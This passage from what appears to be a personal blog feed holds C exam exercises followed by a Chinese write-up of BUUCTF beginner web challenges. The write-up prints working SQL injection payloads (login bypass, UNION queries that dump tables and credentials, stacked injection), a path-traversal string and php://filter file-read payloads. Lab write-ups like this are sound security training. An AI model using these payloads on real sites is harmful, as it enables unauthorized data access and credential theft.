str[i]) &amp;&amp; (<span class="string">&#x27;Z&#x27;</span> &gt;= str[i]))) &#123;</span><br><span class="line">			item = str[i];</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; len<span class="number">-1</span>; j++) &#123;</span><br><span class="line">				str[j] = str[j + <span class="number">1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			str[len - <span class="number">1</span>] = item;</span><br><span class="line">			i--;<span class="comment">//避免有连续的字母，这样就可以不断检测这一位是否是字母</span></span><br><span class="line">		&#125;</span><br><span class="line">		cishu++;</span><br><span class="line">		<span class="keyword">if</span> (cishu &gt;= len) &#123;<span class="comment">//避免无限循环</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入一串字符串：&quot;</span>);</span><br><span class="line">	<span class="keyword">char</span> ch[<span class="number">128</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span>* p;</span><br><span class="line">	p = ch;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, ch);</span><br><span class="line">	fun(ch, p);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n处理如下：%s&quot;</span>, ch);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/21/20%E5%B9%B4%E4%B8%89%E9%81%93%E7%BC%96%E7%A8%8B%E5%A4%A7%E9%A2%98/image-20231011231316782.png" alt="image-20231011231316782"></p>
<h1 id="第二题-求数组列和"><a href="#第二题-求数组列和" class="headerlink" title="第二题-求数组列和"></a>第二题-求数组列和</h1><p><img src="/2023/10/21/20%E5%B9%B4%E4%B8%89%E9%81%93%E7%BC%96%E7%A8%8B%E5%A4%A7%E9%A2%98/image-20231011232331406.png" alt="image-20231011232331406"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> arr[][<span class="number">3</span>], <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//我们这里就求一个3行3列数组的第一列和最后一列之和。</span></span><br><span class="line">	<span class="keyword">int</span> arr[<span class="number">3</span>][<span class="number">3</span>] = &#123; &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">7</span>,<span class="number">8</span>,<span class="number">2</span>&#125;,&#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125; &#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, fun(arr, <span class="number">3</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> arr[][<span class="number">3</span>], <span class="keyword">int</span> n)</span> </span>&#123;<span class="comment">//n为n行数组的意思</span></span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="comment">//循环第一列</span></span><br><span class="line">		sum += arr[i][<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="comment">//循环最后一列</span></span><br><span class="line">		sum += arr[i][<span class="number">2</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="第三题-结构体指针"><a href="#第三题-结构体指针" class="headerlink" title="第三题-结构体指针"></a>第三题-结构体指针</h1><p><img src="/2023/10/21/20%E5%B9%B4%E4%B8%89%E9%81%93%E7%BC%96%E7%A8%8B%E5%A4%A7%E9%A2%98/image-20231021194501769.png" alt="image-20231021194501769"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">	<span class="keyword">int</span> english;</span><br><span class="line">	<span class="keyword">int</span> math;</span><br><span class="line">	<span class="keyword">int</span> politics;</span><br><span class="line">	<span class="keyword">int</span> specialised;</span><br><span class="line">	<span class="keyword">int</span> SUM = english + math + politics + specialised;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(struct Student aa[], <span class="keyword">int</span> (*p)(struct Student aa[]))</span> </span>&#123;</span><br><span class="line">	<span class="comment">//p指向fun2</span></span><br><span class="line">	<span class="keyword">return</span> 	p(aa);;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun2</span><span class="params">(struct Student aa[])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">aa</span>[4] =</span> &#123;</span><br><span class="line">	&#123;<span class="string">&quot;越江&quot;</span>, <span class="number">65</span>, <span class="number">85</span>, <span class="number">60</span>, <span class="number">110</span>&#125;,</span><br><span class="line">	&#123;<span class="string">&quot;张三&quot;</span>, <span class="number">77</span>, <span class="number">100</span>, <span class="number">60</span>, <span class="number">60</span>&#125;,</span><br><span class="line">	&#123;<span class="string">&quot;李四&quot;</span>, <span class="number">60</span>, <span class="number">60</span>, <span class="number">60</span>, <span class="number">60</span>&#125;,</span><br><span class="line">	&#123;<span class="string">&quot;王五&quot;</span>, <span class="number">75</span>, <span class="number">75</span>, <span class="number">75</span>, <span class="number">75</span>&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">int</span> max_index = fun(aa,fun2);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;获得最高分的是国服%s，分数为：%d&quot;</span>, aa[max_index].name, aa[max_index].SUM);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun2</span><span class="params">(struct Student aa[])</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> av_english, av_math, av_politcs, av_specialised;</span><br><span class="line">	<span class="keyword">char</span> av_name[<span class="number">20</span>];</span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> sum2 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> sum3 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> sum4 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">		sum += aa[i].english;</span><br><span class="line">		sum2 += aa[i].math;</span><br><span class="line">		sum3 += aa[i].politics;</span><br><span class="line">		sum4 += aa[i].specialised;</span><br><span class="line">	&#125;</span><br><span class="line">	av_english = sum / <span class="number">4</span>;</span><br><span class="line">	av_math = sum2 / <span class="number">4</span>;</span><br><span class="line">	av_politcs = sum3 / <span class="number">4</span>;</span><br><span class="line">	av_specialised = sum4 / <span class="number">4</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;平均成绩\n英语：%d\n数学：%d\n政治：%d\n专业课：%d\n&quot;</span>, av_english, av_math, av_politcs, av_specialised);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> max_index = <span class="number">0</span>;<span class="comment">//只记录一个最大分就可</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (aa[i].SUM &gt; aa[max_index].SUM) &#123;</span><br><span class="line">			max_index = i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> max_index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-c</category>
      </categories>
  </entry>
  <entry>
    <title>BUUCTF 的一些签到题 内有sql 命令执行(内联)</title>
    <url>/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/</url>
    <content><![CDATA[<h1 id="BUUCTF-的一些签到题-内有sql-命令执行"><a href="#BUUCTF-的一些签到题-内有sql-命令执行" class="headerlink" title="BUUCTF 的一些签到题 内有sql 命令执行"></a>BUUCTF 的一些签到题 内有sql 命令执行</h1><h2 id="第一题-easy-sql"><a href="#第一题-easy-sql" class="headerlink" title="第一题 easy sql"></a>第一题 easy sql</h2><p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115110256458.png" alt="image-20220115110256458"></p>
<p>直接在admin那里用’’ or 1=1#</p>
<p>密码那也可以’’ or 1=1#  记得#要用%23</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115110523694.png" alt="image-20220115110523694"></p>
<h2 id="第二题-php-代码审计"><a href="#第二题-php-代码审计" class="headerlink" title="第二题 php 代码审计"></a>第二题 php 代码审计</h2><p>打开看源代码发现提示</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115110631989.png" alt="image-20220115110631989"></p>
<p>打开提示得到一串源码</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115110716784.png" alt="image-20220115110716784"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">//白名单列表</span></span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="comment">//isset()判断变量是否声明is_string()判断变量是否是字符串 &amp;&amp;用了逻辑与两个值都为真才执行if里面的值</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it A&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//过滤问号的函数(如果$page的值有？则从?之前提取字符串)</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)<span class="comment">//返回$page.?里卖弄?号出现的第一个位置</span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">             <span class="comment">//第二次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//url对$page解码</span></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//第二次过滤问号的函数(如果$page的值有？则从?之前提取字符串)</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="comment">//第三次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在源码中发现了一个hint.php去看一下</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115111610174.png" alt="image-20220115111610174"></p>
<p>得到提示</p>
<p>根据我们的审计，首先我们要传参file，是字符串类型，然后让函数checkfile返回为真。</p>
<p>hint.php?../../../../../ffffllllaaaagggg 我们可以想象他传入checkFile函数要经历 第一次白名单验证 一次？过滤后他就是hint.php 再进行一次白名单验证 返回为真 则达成条件进行包含得到flag</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115113729499.png" alt="image-20220115113729499"></p>
<h2 id="第三题-简单小题"><a href="#第三题-简单小题" class="headerlink" title="第三题 简单小题"></a>第三题 简单小题</h2><p>在源代码中有个注释</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115113908245.png" alt="image-20220115113908245"></p>
<p>传参cat=dog得到flag</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115113926285.png" alt="image-20220115113926285"></p>
<h2 id="第四题-文件包含伪协议"><a href="#第四题-文件包含伪协议" class="headerlink" title="第四题 文件包含伪协议"></a>第四题 文件包含伪协议</h2><p>先查一下伪协议的使用 有点忘了</p>
<p><a href="https://blog.csdn.net/weixin_45588247/article/details/119348342">(32条消息) 【文件包含漏洞】——文件包含漏洞进阶_PHP伪协议_剑客 getshell的博客-CSDN博客</a></p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115114717651.png" alt="image-20220115114717651"></p>
<p>打开题目是这样的</p>
<p>然后就用?file=php://filter/read=convert.base64-encode/resource=./flag.php</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115114822119.png" alt="image-20220115114822119"></p>
<p>然后就base64解密</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Can you find out the flag?&quot;</span>;</span><br><span class="line"><span class="comment">//flag&#123;8888b971-6d8f-4507-892a-eddd64932264&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="第五题-强网杯随便注-经典题目了"><a href="#第五题-强网杯随便注-经典题目了" class="headerlink" title="第五题 强网杯随便注 经典题目了"></a>第五题 强网杯随便注 经典题目了</h2><p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115115110263.png" alt="image-20220115115110263"></p>
<p>堆叠注入</p>
<p>然后预处理和大小写绕过selct与prepare，set</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115121839028.png" alt="image-20220115121839028"></p>
<h2 id="第六题-sql注入"><a href="#第六题-sql注入" class="headerlink" title="第六题 sql注入"></a>第六题 sql注入</h2><p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115122524341.png" alt="image-20220115122524341"></p>
<p>输入1有回显，试了下堆叠注入。</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115122558307.png" alt="image-20220115122558307"></p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115122647147.png" alt="image-20220115122647147"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">但是要用select的时候返回了nonono，说明select关键字又被过滤了，那再试一下预处理。</span><br><span class="line"></span><br><span class="line">也不行，麻了，我是真的菜狗啊。</span><br></pre></td></tr></table></figure>

<p>然后就去看别人的wp</p>
<p>(≧∇≦)ﾉ顺便偷了个葵花宝典</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/1658967-20200622120028704-1362680601.png" alt="img"></p>
<p>别人的wp：</p>
<p>这道题目需要我们去对后端语句进行猜测，有点矛盾的地方在于其描述的功能和实际的功能似乎并不相符，通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用</p>
<p>解法1</p>
<p>输入的内容为*,1</p>
<p>内置的sql语句为sql=”select”.sql=”select”.post[‘query’].”||flag from Flag”;</p>
<p>如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内容</p>
<p>解法2</p>
<p>输入的内容为1;set sql_mode=pipes_as_concat;select 1</p>
<p>其中set sql_mode=pipes_as_concat的作用是将||的作用由or变为拼接字符串</p>
<h2 id="第七题-命令执行漏洞"><a href="#第七题-命令执行漏洞" class="headerlink" title="第七题 命令执行漏洞"></a>第七题 命令执行漏洞</h2><p><a href="https://www.cnblogs.com/happystudyhuan/p/11458455.html">命令执行漏洞 - 再简单一点点 - 博客园 (cnblogs.com)</a></p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115143436249.png" alt="image-20220115143436249"></p>
<h2 id="第八题-伪协议"><a href="#第八题-伪协议" class="headerlink" title="第八题 伪协议"></a>第八题 伪协议</h2><p>在源码中发现了一个文件，前去看看</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94%5Cimage-20220115144300054.png" alt="image-20220115144300054"></p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115145927816.png" alt="image-20220115145927816"></p>
<p>抓包发现新东西</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115145958610.png" alt="image-20220115145958610"></p>
<p>开始代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>简单，继续用伪协议</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115150131652.png" alt="image-20220115150131652"></p>
<p>base解密</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115150207094.png" alt="image-20220115150207094"></p>
<h2 id="第九题-sql注入"><a href="#第九题-sql注入" class="headerlink" title="第九题 sql注入"></a>第九题 sql注入</h2><p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115150411281.png" alt="image-20220115150411281"></p>
<p>又是sql注入，他说不让用map就不用？</p>
<p>好嘛没扫出来。</p>
<p>万能密码也行不通了，开始手动注入</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115151050988.png" alt="image-20220115151050988"></p>
<p>order by4报错，就是说有3列</p>
<p>payload：-1’ union select database(),2,3;#</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115151455966.png" alt="image-20220115151455966"></p>
<p>回显的是2,3</p>
<p>payload：-1’ union select 1,database(),user();#</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115151728456.png" alt="image-20220115151728456"></p>
<p>得到数据库名字</p>
<p>然后就开始爆表</p>
<p>-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() ;#</p>
<p>爆字段</p>
<p>-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’l0ve1ysq1’ ;#</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115153816044.png" alt="image-20220115153816044"></p>
<p>爆数据：</p>
<p>-1’ union select 1,2,group_concat(id,username,password) from l0ve1ysq1 ;#</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115153828210.png" alt="image-20220115153828210"></p>
<p>得到flag</p>
<p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115153915190.png" alt="image-20220115153915190"></p>
